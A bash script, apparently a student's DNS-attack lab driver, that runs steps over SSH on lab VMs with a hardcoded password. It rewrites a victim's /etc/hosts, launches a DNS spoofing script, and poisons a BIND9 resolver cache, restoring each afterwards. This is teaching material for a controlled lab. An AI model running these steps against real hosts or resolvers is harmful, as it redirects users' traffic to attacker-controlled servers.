#!/bin/bash
PLINK="/d/Program Files/plink.exe"; UK="SHA256:EV+sCn6XJ2L3F0/Z7u0V+Ws44i+cbBANARy+EAxofSE"
DNS=192.168.226.132; VIC=192.168.226.137; ATK=192.168.226.138
P(){ "$PLINK" -batch -hostkey "$UK" -pw 123456 thtra@"$1" "${@:2}" 2>&1; }
SUDO(){ "$PLINK" -batch -hostkey "$UK" -pw 123456 thtra@"$1" "sudo ${*:2}" 2>&1; }
B(){ printf '\n\033[1;36m===== %s =====\033[0m\n' "$*"; }
N(){ printf '\033[1;33m>> %s\033[0m\n' "$*"; }
R(){ printf '   \033[0;32m%s\033[0m\n' "$*"; }
H(){ printf '\033[1;37m  LAB8 LOCAL DNS ATTACK | Hoang Thanh Tra - 1150080120 - 11CNPM2\033[0m\n'; }
case "$1" in
 topo) clear; H; B "MO HINH & DIA CHI DNS-LAB (3 may)"
   N "DNS-SERVER 10.9.0.10 (BIND9 resolver/cache + authoritative lab9.test)"; P $DNS "ip -br -4 addr show ens37"
   N "VICTIM 10.9.0.100 (+DMZ 172.16.6.10 web that, 172.16.6.20 auth-dns)"; P $VIC "ip -br -4 addr show ens37"
   N "ATTACKER 10.9.0.200 (scapy + promiscuous)"; P $ATK "ip -br -4 addr show ens37"
   SUDO $DNS "rndc flush">/dev/null; P $DNS "dig +short +time=12 +tries=1 @10.9.0.10 www.external.lab9.test>/dev/null 2>&1"
   B "BASELINE - phan giai HOP LE"
   N "dig @10.9.0.10 www.lab9.test"; R "$(P $DNS dig +short @10.9.0.10 www.lab9.test)"
   N "dig @10.9.0.10 www.external.lab9.test (uy quyen->AUTH 172.16.6.20)"; R "$(P $DNS dig +short @10.9.0.10 www.external.lab9.test)"
   N "[VICTIM] curl www.lab9.test (trang that)"; R "$(P $VIC 'curl -s --max-time 8 http://www.lab9.test/|sed -n "s/.*<h1>\(.*\)<\/h1>.*/\1/p"')" ;;
 task1) clear; H; B "TASK 1 - THAY DOI /etc/hosts (redirect cuc bo)"
   SUDO $VIC "bash -c 'cp -n /etc/hosts /etc/hosts.lab8bak; grep -q 10.9.0.200 /etc/hosts||echo \"10.9.0.200 www.lab9.test\">>/etc/hosts'">/dev/null
   N "Them: 10.9.0.200 www.lab9.test vao /etc/hosts VICTIM"; R "$(P $VIC 'tail -1 /etc/hosts')"
   N "[VICTIM] getent hosts www.lab9.test"; R "$(P $VIC getent hosts www.lab9.test)"
   N "[VICTIM] curl www.lab9.test -> TRANG GIA"; R "$(P $VIC 'curl -s --max-time 6 http://www.lab9.test/|sed -n "s/.*<h1>\(.*\)<\/h1>.*/\1/p"')"
   N "dig @10.9.0.10 www.lab9.test VAN tra THAT:"; R "$(P $DNS dig +short @10.9.0.10 www.lab9.test)"
   SUDO $VIC "cp /etc/hosts.lab8bak /etc/hosts">/dev/null; N "Khoi phuc -> getent:"; R "$(P $VIC getent hosts www.lab9.test)" ;;
 task2) clear; H; B "TASK 2 - DIRECT DNS SPOOFING (mode victim)"
   SUDO $DNS "rndc flush">/dev/null
   ( SUDO $ATK "timeout 8 tcpdump -nni ens37 -w /tmp/task2.pcap udp port 53">/dev/null 2>&1 ) & sleep 2
   ( P $ATK "sudo timeout 12 python3 -u /opt/dns_spoof_lab9.py --mode victim --iface ens37">/tmp/s2.log 2>&1 ) & SP=$!; sleep 3
   N "[VICTIM] dig www.external.lab9.test"; R "$(P $VIC dig +short +time=8 www.external.lab9.test)  <== DAP GIA THANG"
   N "[VICTIM] curl www.lab9.test (trang that)"; R "$(P $VIC 'curl -s --max-time 8 http://www.lab9.test/|sed -n "s/.*<h1>\(.*\)<\/h1>.*/\1/p"')"
   wait $SP 2>/dev/null; N "Log attacker:"; grep -i forged /tmp/s2.log|tail -1|sed 's/^/   /'
   N "Bang chung goi (task2.pcap):"; SUDO $ATK "tcpdump -nr /tmp/task2.pcap 'udp port 53'" 2>/dev/null|grep 10.9.0.200|head -2|sed 's/^/   /' ;;
 task3) clear; H; B "TASK 3 - DNS CACHE POISONING (mode resolver)"
   SUDO $DNS "rndc flush">/dev/null
   ( SUDO $ATK "timeout 8 tcpdump -nni ens37 -w /tmp/task3.pcap udp port 53">/dev/null 2>&1 ) & sleep 2
   ( P $ATK "sudo timeout 12 python3 -u /opt/dns_spoof_lab9.py --mode resolver --iface ens37">/tmp/s3.log 2>&1 ) & SP=$!; sleep 3
   N "[VICTIM] dig www.external.lab9.test (kich hoat forward)"; R "$(P $VIC dig +short +time=8 www.external.lab9.test)"
   wait $SP 2>/dev/null; N "Log attacker:"; grep -i forged /tmp/s3.log|tail -1|sed 's/^/   /'
   N "SAU KHI DUNG attacker - cache Resolver VAN tra gia:"; R "$(P $DNS dig +short @10.9.0.10 www.external.lab9.test)"
   N "Dump cache BIND9:"; SUDO $DNS "rndc dumpdb -cache">/dev/null; sleep 1; SUDO $DNS "grep -i www.external.lab9 /var/cache/bind/named_dump.db" 2>/dev/null|grep -v '^;'|head -1|sed 's/^/   /'
   N "Khoi phuc (rndc flush):"; SUDO $DNS "rndc flush">/dev/null; P $DNS "dig +short +time=12 +tries=1 @10.9.0.10 www.external.lab9.test>/dev/null 2>&1"; R "dig -> $(P $DNS dig +short @10.9.0.10 www.external.lab9.test)" ;;
esac
echo; echo "----- het phan $1 -----"
